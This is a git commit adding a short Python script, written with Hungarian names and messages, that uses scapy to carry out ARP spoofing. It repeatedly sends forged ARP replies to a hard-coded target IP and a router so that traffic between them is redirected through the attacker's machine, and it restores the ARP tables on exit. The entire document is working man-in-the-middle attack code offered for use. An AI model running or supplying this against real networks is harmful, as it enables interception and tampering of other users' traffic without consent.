ebfec2bdaabe9ff09bdf6fbe00262f1adaa6ff05
N.Tibor <apple.tibor@gmail.com>
2019-10-03 20:17:36 +0200

    ARP Spoofer

---
+++ arpspoofer.py
@@ -0,0 +1,44 @@
+import scapy.all as scapy
+import os
+import sys
+import time
+
+def spoof(celpont_ip, spoofolt_ip):
+    celpont_mac = mac_cim_beolvasas(celpont_ip)
+    packet = scapy.ARP(op=2, pdst=celpont_ip, hwdst=celpont_mac, psrc=spoofolt_ip)
+    scapy.send(packet, verbose=False)
+
+def mac_cim_beolvasas(ip):
+    arp_keres = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    egyesitett_keres = broadcast/arp_keres
+    valaszolt = scapy.srp(egyesitett_keres, timeout=1, verbose=False)[0]
+
+    return valaszolt[0][1].hwsrc
+
+def visszaallit(forras_ip, cel_ip):
+    cel_mac = mac_cim_beolvasas(cel_ip)
+    forras_mac = mac_cim_beolvasas(forras_ip)
+    packet = scapy.ARP(op=2, pdst=cel_ip, hwdst=cel_mac, psrc=forras_ip, hwsrc=forras_mac)
+    scapy.send(packet, verbose=False)
+
+elkuldott_packetek = 0
+celpont = '192.168.0.195'
+router = '192.168.56.1'
+
+try:
+    while True:
+        spoof(celpont, router)
+        spoof(router, celpont)
+        elkuldott_packetek += 2
+        print('\r[+] Elküldött packetek száma:', elkuldott_packetek, end='')
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        os.system('clear')
+    print('[+] CTRL + C -t érzékeltünk, a program befejezi a futását...')
+    visszaallit(router, celpont)
+    visszaallit(celpont, router)
